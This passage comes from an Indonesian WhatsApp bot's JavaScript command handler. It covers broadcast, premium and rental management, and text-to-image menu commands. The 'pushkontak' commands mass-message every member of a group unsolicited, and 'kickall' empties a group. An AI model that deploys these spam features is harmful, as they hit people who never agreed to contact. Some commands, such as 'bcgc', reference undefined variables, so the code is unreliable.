break
}
case 'bcimage': case 'bcimg':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Reply foto dengan caption ${prefix + command} Tes`)
if (!/image/.test(mime)) return newReply(`Reply foto dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await Aira.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `*「 BROADCAST AIRA.Ai 」*\n\n${text}`
Aira.sendMessage(apaan, {image: buffer, caption: txt}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcvideo': case 'bcvid':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Reply video dengan caption ${prefix + command} Tes`)
if (!/video/.test(mime)) return newReply(`Reply video dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await Aira.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `*「 BROADCAST AIRA.Ai 」*\n\n${text}`
Aira.sendMessage(apaan, {video: buffer, caption: txt, mimetype: 'video/mp4', duration: 909090909}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcaudio': case 'bcaud':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!/audio/.test(mime)) return newReply(`Reply audio dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await Aira.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `*「 BROADCAST AIRA.Ai 」*\n\n${text}`
Aira.sendMessage(apaan, {audio: buffer, mimetype: 'audio/mpeg', ptt: false, duration: 909090909}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcvn': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!/audio/.test(mime)) return newReply(`Reply audio dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await Aira.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `*「 BROADCAST AIRA.Ai 」*\n\n${text}`
Aira.sendMessage(apaan, {audio: buffer, mimetype: 'audio/mpeg', ptt: true, duration: 909090909}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcstiker': case 'bcstik': case 'bcsticker':{
if (!isCreator) return newReply(mess.OnlyOwner)
 if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption ${prefix + command}`)
let anu = await store.chats.all().map(v => v.id)
let media = await Aira.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `*「 BROADCAST AIRA.Ai 」*\n\n${text}`
Aira.sendMessage(apaan, {sticker :{url : media}}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bc': case 'broadcast': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply (`Example : ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let todd = await Aira.reSize(`${setting.pathimg}`, 300, 300) 
newReply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let apaan of anu) {
await sleep(1500)
Aira.sendMessage(apaan, {image: todd, caption: `*「 BROADCAST AIRA.Ai 」*\n\n${text}`})
}
newReply('Sukses Broadcast')
}
break
case 'bcgc': case 'bcgroup': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply (`Example : ${prefix + command} Tes`)
let getGroups = await Aira.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
Aira.sendMessage(apaan, {image: todd, caption: `*「 BROADCAST AIRA.Ai 」*\n\n${text}`})
}
newReply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bcall': case 'broadcastall': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply (`Example : ${prefix + command} Tes`)
let todd = await Aira.reSize(`${setting.pathimg}`, 300, 300) 
newReply(`Mengirim Broadcast Ke ${pendaftar.length} Chat\nWaktu Selesai ${pendaftar.length * 1.5} detik`)
for (let apaan of pendaftar) {
await sleep(1500)
Aira.sendMessage(apaan, {image: todd, caption: `*「 BROADCAST AIRA.Ai 」*\n\n${text}`})
}
newReply('Sukses Broadcast')
}
break
case "cekidgc": {
if (!isPremium && !isCreator) return reply(mess.OnlyPrem)
let getGroups = await Aira.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Aira.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "pushkontakv1":{
if (!isCreator) return reply(`Khusus ryu Aja`)
if (!m.isGroup) return reply('cuma bisa di private')
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
const groupMetadataa = !isGroup? await Aira.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
tekspushkon = text.split("|")[1]
for (let mem of halls) {
await sleep(30000)
Aira.sendMessage(mem, { text: tekspushkon })
}
newReply(`sukses Broadcast`)
}
break



case 'pushkontak': {
if (!isCreator) return newReply('*Khusus Owner Bot*')
if (!m.isGroup) return newReply('Hanya bisa digunakan di dalam grup')
var name = text.split('|')[0]
var chet = text.split('|')[1]
if (!name) return newReply(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} Aira|sv uy udh gw sv back`) 
if (!chet) return newReply(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} Aira|sv uy udh gw sv back`) 
let kontk = {
displayName: "Contact",
contacts: [{
displayName: name,
vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + name + ";;;\nFN:" + name + "\nitem1.TEL;waid=" + m.sender.split('@')[0] + ":" + m.sender.split('@')[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
}]
}
let pkDetect = await Aira.groupMetadata(m.chat)
if (pkDetect.participants.length > 200) return newReply('Batas member maksimal; 200')
newReply('Gasken pushkontak total member ' + pkDetect.participants.length + ' member')
for (let a of pkDetect.participants) {
Aira.sendMessage(a.id, {
contacts: kontk
})
await sleep(500)
Aira.sendMessage(a.id, {
text: chet,
contextInfo:
{
"externalAdReply": {
"title": botName, 
"body": `Ijin Pushkontak Om`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: instagram, 
thumbnailUrl: pathimg, 
}
}
})
await sleep(500)
} // (?); kirim pesan ke semua peserta grup
newReply('(Group: *' + pkDetect.subject + '*\nMember: ' + pkDetect.participants.length + '\ndelay: 500\nBERHASIL PUSH')
	}
break
case 'kickall':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let pkDetect = await Aira.groupMetadata(m.chat)
for (let a of pkDetect.participants) {
if (a.id==botNumber){ return }
else{
await Aira.groupParticipantsUpdate(m.chat, [a.id], 'remove')}
await sleep(2500)
}
newReply('BERHASIL MEMBUBARKAN GRUP')
}
break
case 'delchat':
if (!isCreator) return newReply(mess.OnlyOwner)
var teks = q ? q : m.chat
await Aira.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, teks)
newReply('Sukses!')
break
case 'bcsewa': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply (`Example : ${prefix + command} Tes`)
addCountCmd('#bcsewa', m.sender, _cmd)
for (let i of sewa){
await Aira.sendMessage(i.id, { text: `*「 BROADCAST SEWA AIRA.Ai 」*\n\n${text}` })
await sleep(3000) 
}
newReply(`Sukses bc ke ${sewa.length}`)
}
break
case 'addprem':{
if (!isCreator) return newReply(mess.OnlyOwner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return newReply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return newReply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
addCountCmd('#addprem', m.sender, _cmd)
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
let noprem;
if (pcknm.startsWith('@')){
noprem = pcknm.split('@')[1]+'@s.whatsapp.net'
noprem = noprem.replace(' @','@')
}
else{
noprem = pcknm+'@s.whatsapp.net'
}
newReply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${noprem}\n➸ *MASA AKTIF*: ${atnm}`)
Aira.sendMessage(noprem, { text: `*「 PAKET PREMIUM BERHASIL DIAKTIFKAN 」*\n\n➸ *ID ANDA*: ${pcknm}\n➸ *MASA AKTIF*: ${atnm}\n\n UNTUK MENGECEK SISA WAKTU PREMIUM ANDA SILAHKAN KETIK *.cekpremium*` })
} else {
var cekap = await Aira.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return newReply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
addCountCmd('#addprem', m.sender, _cmd)
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
newReply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${pcknm}\n*MASA AKTIF*: ${atnm}`)
let noprem2 = pcknm.replace('@','')+'@s.whatsapp.net'
Aira.sendMessage(noprem2, { text: `*「 PAKET PREMIUM BERHASIL DIAKTIFKAN 」*\n\n➸ *ID ANDA*: ${pcknm}\n➸ *MASA AKTIF*: ${atnm}\n\n UNTUK MENGECEK SISA WAKTU PREMIUM ANDA SILAHKAN KETIK *.cekpremium*` })
}}
break
case 'delprem':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!args[0]) return newReply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
addCountCmd('#delprem', m.sender, _cmd)
premium.splice(_prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
newReply('Sukses!')
} else {
var cekpr = await Aira.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return newReply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
addCountCmd('#delprem', m.sender, _cmd)
premium.splice(_prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
newReply('Sukses!')
}}
break
case 'addsewa':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (text < 2) return newReply(`Gunakan dengan cara ${prefix+command} *linkgc waktu*\n\nContoh : ${prefix+command} https://chat.whatsapp.com/PnwpPqn0b 30d`)
if (!isUrl(args[0])) return newReply(mess.error.Iv)
var url = args[0]
addCountCmd('#addsewa', m.sender, _cmd)
url = url.split('https://chat.whatsapp.com/')[1]
if (!text) return newReply(`Waktunya?`)
var data = await Aira.groupAcceptInvite(url)
if (_sewa.checkSewaGroup(data, sewa)) return newReply(`Bot sudah disewa oleh grup tersebut!`)
_sewa.addSewaGroup(data, args[1], sewa)
newReply(`*「 SEWA ADDED 」*\n\n➸ *ID*: ${url}\n*MASA AKTIF*: ${args[1]}`)}
break
case 'delsewa':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!m.isGroup) return newReply(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
if (!isSewa) return newReply(`Bot tidak disewa di Grup ini`)
addCountCmd('#delsewa', m.sender, _cmd)
sewa.splice(_sewa.getSewaPosition(args[0] ? args[0] : m.chat, sewa), 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
newReply(`Sukses`)}
break
case 'resetlimit':{
if (!isCreator) return newReply(mess.OnlyOwner)
addCountCmd('#resetlimit', m.sender, _cmd)
limit = []
fs.writeFileSync('./database/limit.json', JSON.stringify(limit, null, 2))
glimit = []
fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit, null, 2))
newReply(`Sukses reset limit pengguna`)}
break
case 'halloween2':case 'horror':case 'game8bit':case 'layered':case 'glitch2':case 'coolg':case 'coolwg':case 'realistic':case 'space3d':case 'gtiktok':case 'stone':case 'marvel':case 'marvel2':case 'pornhub':case 'avengers':case 'metalr':case 'metalg':case 'metalg2':case 'lion':case 'wolf_bw':case 'wolf_g':case 'ninja':case '3dsteel':case 'horror2':case 'lava':case 'bagel':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let texproo = await getBuffer(`https://api.zeeoneofc.my.id/api/textpro/${command}?text=${m1}&text2=${m2}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: texproo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(util.format(err))
})
}
break
//photooxy menu
case 'photooxymenu':{
if (!text) return newReply(`╭─▸ *PHOTOOXY MENU*
│
├❖ *LIST*
│1 ▸ ${prefix}*typography-flower (Text)*
│2 ▸ ${prefix}*under-flower (Text)*
│3 ▸ ${prefix}*bevel-text (Text)*
│4 ▸ ${prefix}*silk-text (Text)*
│5 ▸ ${prefix}*smoke-typography (Text)*
│6 ▸ ${prefix}*carvedwood (Text)*
│7 ▸ ${prefix}*scary-cemetery (Text)*
│8 ▸ ${prefix}*royallook (Text)*
│9 ▸ ${prefix}*coffeecup2 (Text)*
│10 ▸ ${prefix}*illuminated (Text)*
│11 ▸ ${prefix}*harry-potter2 (Text)*
│12 ▸ ${prefix}*woodblack (Text)*
│13 ▸ ${prefix}*butterfly-reflection (Text)*
│14 ▸ ${prefix}*watermelon (Text)*
│15 ▸ ${prefix}*striking (Text)*
│16 ▸ ${prefix}*metallicglow (Text)*
│17 ▸ ${prefix}*rainbow-text (Text)*
│18 ▸ ${prefix}*birthday-cake (Text)*
│19 ▸ ${prefix}*embroidery (Text)*
│20 ▸ ${prefix}*crisp (Text)* 
│21 ▸ ${prefix}*flaming (Text)*
│22 ▸ ${prefix}*furtext (Text)*
│23 ▸ ${prefix}*nightsky (Text)*
│24 ▸ ${prefix}*glow-rainbow (Text)*
│25 ▸ ${prefix}*gradient-avatar (Text)*
│26 ▸ ${prefix}*white-cube (Text)*
│27 ▸ ${prefix}*honey-text (Text)*
│28 ▸ ${prefix}*vintage-style (Text)*
│29 ▸ ${prefix}*glowing-3d (Text)*
│30 ▸ ${prefix}*army-camouflage (Text)*
│31 ▸ ${prefix}*graffiti-cover (Text)*
│32 ▸ ${prefix}*rainbow-shine (Text)*
│33 ▸ ${prefix}*smoky-neon (Text)*
│34 ▸ ${prefix}*quotes-underfall (Text)*
│35 ▸ ${prefix}*vector-nature (Text)*
│36 ▸ ${prefix}*yellow-rose (Text)*
│37 ▸ ${prefix}*love-text (Text)*
│38 ▸ ${prefix}*underwater-ocean (Text)*
│39 ▸ ${prefix}*nature-text (Text)*
│40 ▸ ${prefix}*wolf-metal (Text)*
│41 ▸ ${prefix}*summer-text (Text)*
│42 ▸ ${prefix}*wooden-board (Text)*
│43 ▸ ${prefix}*quote-wood (Text)*
│44 ▸ ${prefix}*quotes-undergrass (Text)*
│45 ▸ ${prefix}*naruto-banner (Text)*
│46 ▸ ${prefix}*love-message (Text)*
│47 ▸ ${prefix}*textoncup2 (Text)*
│48 ▸ ${prefix}*burn-paper (Text)*
│49 ▸ ${prefix}*smoke (Text)*
│50 ▸ ${prefix}*romantic-messages (Text)*
│51 ▸ ${prefix}*shadow-sky (Text)*
│52 ▸ ${prefix}*text-cup (Text)*
│53 ▸ ${prefix}*coffecup (Text)*
│54 ▸ ${prefix}*battlegrounds-logo (Text1) | (Text2)*
│55 ▸ ${prefix}*battlefield4 (Text1) | (Text2)*
│56 ▸ ${prefix}*text-8bit (Text1) | (Text2)*
│
╰────────────˧`)
}
break

case 'battlegrounds-logo': case 'battlefield4': case 'text-8bit':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let photooxy = await getBuffer(`https://api.zeeoneofc.my.id/api/photooxy/${command}?text=${m1}&text2=${m2}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: photooxy, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(util.format(err))
})
}
break
//photooxy menu
case 'typography-flower': case 'under-flower': case 'bevel-text': case 'silk-text': case 'sweet-andy': case 'smoke-typography': case 'carvedwood': case 'scary-cemetery': case 'royallook': case 'coffeecup2': case 'illuminated': case 'harry-potter2': case 'woodblack': case 'butterfly-reflection': case 'watermelon': case 'striking': case 'metallicglow': case 'rainbow-text': case 'birthday-cake': case 'embroidery': case 'crisp': case 'flaming': case 'furtext': case 'nightsky': case 'glow-rainbow': case 'gradient-avatar': case 'white-cube': case 'honey-text': case 'vintage-style': case 'glowing-3d': case 'army-camouflage': case 'graffiti-cover': case 'rainbow-shine': case 'smoky-neon': case 'quotes-underfall': case 'vector-nature': case 'yellow-rose': case 'love-text': case 'underwater-ocean': case 'nature-text': case 'wolf-metal': case 'summer-text': case 'wooden-board': case 'quote-wood': case 'quotes-undergrass': case 'naruto-banner': case 'love-message': case 'textoncup2': case 'burn-paper': case 'smoke': case 'romantic-messages': case 'shadow-sky': case 'text-cup': case 'coffecup':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*`)
newReply(mess.wait)
let photooxy = await getBuffer(`https://api.zeeoneofc.my.id/api/photooxy/${command}?text=${q}&apikey=${setting.BotKey}`)
try{
await Aira.sendMessage(m.chat, {image: photooxy, caption: "Done kak"}, {quoted: m})
}  catch (err){
newReply(mess.error.api) 
}
}
break
//logomaker
case 'avataroverwatch': case 'logoaccording': case 'mascotstyle': case 'letterlogos':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|thumb*\n*Untuk List Thumb Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|thumb*\n*Untuk List Thumb Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&thumb=${m3}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listavataroverwatch': {
if (!text) return newReply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *mccree*
│2 ▸ *mercy*
│3 ▸ *zenyatta*
│4 ▸ *zarya*
│5 ▸ *winston*
│6 ▸ *widowmaker*
│7 ▸ *tracer*
│8 ▸ *torbjorn*
│9 ▸ *symmetra*
│10 ▸ *sombra*
│11 ▸ *soldier76*
│12 ▸ *soldier_76*
│13 ▸ *roadhog*
│14 ▸ *reinhardt*
│15 ▸ *reaper2*
│16 ▸ *reaper*
│17 ▸ *pharah*
│18 ▸ *orisa*
│19 ▸ *mei*
│20 ▸ *lucio*
│21 ▸ *junkrat*
│22 ▸ *hanzo*
│23 ▸ *genji*
│24 ▸ *dva*
│25 ▸ *bastion*
│26 ▸ *ana2*
│27 ▸ *ana*
│28 ▸ *doomfist*
│29 ▸ *bg-1*
│
╰────────────˧`)
}
break
case 'listlogoaccording': {
if (!text) return newReply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *bear2*
│2 ▸ *cat2*
│3 ▸ *ceberus*
│4 ▸ *crocodile*
│5 ▸ *dinosaur*
│6 ▸ *dragon3*
│7 ▸ *eagle3*
│8 ▸ *horse2*
│9 ▸ *husky*
│10 ▸ *kraken*
│11 ▸ *lynx*
│12 ▸ *sabertooh*
│13 ▸ *assassin*
│14 ▸ *bee*
│15 ▸ *cat*
│16 ▸ *demon*
│17 ▸ *fox-2*
│18 ▸ *gorilla*
│19 ▸ *horus*
│20 ▸ *octopus*
│21 ▸ *rounin*
│22 ▸ *-2*
│23 ▸ *tiger-3*
│24 ▸ *bg-tiger*
│25 ▸ *bg-buffalo*
│26 ▸ *chicken*
│27 ▸ *bull*
│28 ▸ *bg-wolf*
│29 ▸ *jaguar*
│30 ▸ *horse*
│31 ▸ *eagle*
│32 ▸ *dragon*
│33 ▸ *wolver*
│34 ▸ *shark*
│35 ▸ *sabertooth*
│36 ▸ *rhino*
│37 ▸ *phoenix*
│38 ▸ *lion*
│39 ▸ *hornet*
│40 ▸ *griffin*
│41 ▸ *bear*
│42 ▸ *tiger2*
│43 ▸ *panther*
│44 ▸ *owl*
│45 ▸ *monkey*
│46 ▸ *goat*
│47 ▸ *fox*
│48 ▸ *dragon2*
│49 ▸ *devil*
│50 ▸ *cobra*
│51 ▸ *reaper*
│52 ▸ *pirates*
│53 ▸ *owl2*
│54 ▸ *mask*
│55 ▸ *eagle2*
│56 ▸ *fire*
│57 ▸ *neptune*
│58 ▸ *chamois*
│59 ▸ *parrots*
│60 ▸ *samurai*
│
╰────────────˧`)
}
break
case 'listmascotstyle': {
if (!text) return newReply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *dragon-5*
│2 ▸ *jet*
│3 ▸ *skull-3*
│4 ▸ *skull-cyborg*
│5 ▸ *tiger-4*
│6 ▸ *bee-3*
│7 ▸ *dragon-4*
│8 ▸ *fox-3*
│9 ▸ *goat-2*
│10 ▸ *kitsune*
│11 ▸ *octopus-2*
│12 ▸ *piranha*
│13 ▸ *assassin*
│14 ▸ *wolf*
│15 ▸ *bear-2*
│16 ▸ *cat*
│17 ▸ *ceberus*
│18 ▸ *crocodile*
│19 ▸ *dinosaur*
│20 ▸ *dragon-3*
│21 ▸ *eagle-3*
│22 ▸ *horse-2*
│23 ▸ *husky*
│24 ▸ *kraken*
│25 ▸ *lynx*
│26 ▸ *sabertooh*
│27 ▸ *sabertooth*
│28 ▸ *shark*
│29 ▸ *tiger*
│30 ▸ *tiger2*
│31 ▸ *tiger3*
│32 ▸ *skull2*
│33 ▸ *scorpion*
│34 ▸ *rounin*
│35 ▸ *octopus*
│36 ▸ *horus*
│37 ▸ *gorilla*
│38 ▸ *fox*
│39 ▸ *demon*
│40 ▸ *cat2*
│41 ▸ *bee*
│42 ▸ *dragon*
│43 ▸ *dragon2*
│44 ▸ *owl*
│45 ▸ *eagle*
│46 ▸ *goat*
│47 ▸ *griffin*
│48 ▸ *horse*
│49 ▸ *hornet*
│50 ▸ *lion*
│51 ▸ *panther*
│52 ▸ *phoenix*
│53 ▸ *puma*
│54 ▸ *rooster*
│55 ▸ *rhino*
│56 ▸ *bee2*
│57 ▸ *devil*
│58 ▸ *cobra*
│59 ▸ *bull*
│60 ▸ *bear*
│61 ▸ *monkey*
│62 ▸ *warrior*
│63 ▸ *rabbit*
│64 ▸ *pirates*
│65 ▸ *owl2*
│66 ▸ *neonwolf*
│67 ▸ *lionking*
│68 ▸ *godzilla*
│69 ▸ *flashwolf*
│70 ▸ *fire*
│71 ▸ *eagle2*
│72 ▸ *dog*
│73 ▸ *mask*
│74 ▸ *team*
│75 ▸ *pubg*
│76 ▸ *drift*
│
╰────────────˧`)
}
break
case 'listletterlogos': {
if (!text) return newReply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *a*
│2 ▸ *b*
│3 ▸ *c*
│4 ▸ *d*
│5 ▸ *e*
│6 ▸ *f*
│7 ▸ *g*
│8 ▸ *h*
│9 ▸ *i*
│10 ▸ *j*
│11 ▸ *k*
│12 ▸ *l*
│13 ▸ *m*
│14 ▸ *n*
│15 ▸ *o*
│16 ▸ *p*
│17 ▸ *q*
│18 ▸ *r*
│19 ▸ *s*
│20 ▸ *t*
│21 ▸ *u*
│22 ▸ *v*
│23 ▸ *w*
│24 ▸ *x*
│25 ▸ *y*
│26 ▸ *z*
│
╰────────────˧`)
}
break

case 'bannerofpubg': case 'bannerofapex': case 'bannerofoverwatch': case 'banneroffreefire': case 'gunlogogaming': case 'companylogo': case 'companylogo2': case 'teamlogo':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|background*\n*Untuk List Background Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|background*\n*Untuk List Background Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&background=${m3}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listbannerofpubg': {
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *bg1*
│2 ▸ *bg2*
│3 ▸ *bg3*
│4 ▸ *bg4*
│5 ▸ *bg5*
│6 ▸ *bg6*
│7 ▸ *bg7*
│8 ▸ *bg8*
│9 ▸ *bg9*
│10 ▸ *bg10*
│11 ▸ *bg11*
│
╰────────────˧`)
}
break
case 'listbannerofapex': {
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *bg1*
│2 ▸ *bg2*
│3 ▸ *bg3*
│4 ▸ *bg4*
│5 ▸ *bg5*
│6 ▸ *bg6*
│
╰────────────˧`)
}
break
case 'listbannerofoverwatch': {
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *widowmaker*
│2 ▸ *tracer*
│3 ▸ *symmetra*
│4 ▸ *sombra*
│5 ▸ *soldier76*
│6 ▸ *reinhardt*
│7 ▸ *reaper*
│8 ▸ *orisa*
│9 ▸ *mercy*
│10 ▸ *mei*
│11 ▸ *genji*
│12 ▸ *dva*
│13 ▸ *doomfist*
│14 ▸ *ashe*
│15 ▸ *ana*
│
╰────────────˧`)
}
break
case 'listbanneroffreefire': {
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *andrew*
│2 ▸ *kelly*
│3 ▸ *caroline*
│4 ▸ *laura*
│5 ▸ *maxim*
│6 ▸ *miguel*
│7 ▸ *misha*
│8 ▸ *moco*
│9 ▸ *nikita*
│10 ▸ *notora*
│11 ▸ *olivia*
│12 ▸ *steffi*
│
╰────────────˧`)
}
break
case 'listgunlogogaming': {
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *ak47*
│2 ▸ *ak47-s*
│3 ▸ *an94*
│4 ▸ *ar15*
│5 ▸ *aug*
│6 ▸ *awm*
│7 ▸ *g36k*
│8 ▸ *m4a1*
│9 ▸ *m4-s*
│10 ▸ *m14ebr*
│11 ▸ *m16*
│12 ▸ *m60*
│13 ▸ *m82a1*
│14 ▸ *mp5*
│15 ▸ *scar*
│16 ▸ *svd*
│17 ▸ *xm8*
│18 ▸ *xm1014*
│
╰────────────˧`)
}
break
case 'listcompanylogo2': {
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *1*
│2 ▸ *2*
│3 ▸ *3*
│4 ▸ *4*
│5 ▸ *5*
│6 ▸ *6*
│7 ▸ *7*
│8 ▸ *8*
│9 ▸ *9*
│10 ▸ *10*
│11 ▸ *11*
│12 ▸ *12*
│13 ▸ *13*
│14 ▸ *14*
│15 ▸ *15*
│16 ▸ *16*
